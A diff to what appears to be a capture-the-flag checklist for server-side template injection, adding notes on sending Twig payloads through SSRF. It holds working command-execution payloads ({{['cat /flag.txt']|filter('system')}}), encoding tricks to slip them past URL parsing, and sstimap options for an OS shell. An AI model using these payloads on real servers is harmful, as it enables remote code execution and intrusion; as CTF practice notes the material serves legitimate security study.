@@ -53,6 +53,11 @@
 - [ ] Read flag: `{{ ['cat /flag.txt'] | filter('system') }}`
 - [ ] If `file_excerpt` fails → use `filter('system')` with `cat` instead
 
+### Twig via SSRF (spaces break URL parsing)
+- [ ] Remove ALL spaces from Twig syntax: `{{['cmd']|filter('system')}}` not `{{ ['cmd'] | filter('system') }}`
+- [ ] Use `%09` (tab) for spaces inside the command string: `{{['cat%09/flag.txt']|filter('system')}}`
+- [ ] Use `--data-urlencode` for the outer `api` parameter — do NOT use raw `-d`
+
 ### Automated
 - [ ] `python3 sstimap.py -u "http://<TARGET>/?param=test"` — auto-detect
 - [ ] `-S <cmd>` for single command, `--os-shell` for interactive shell
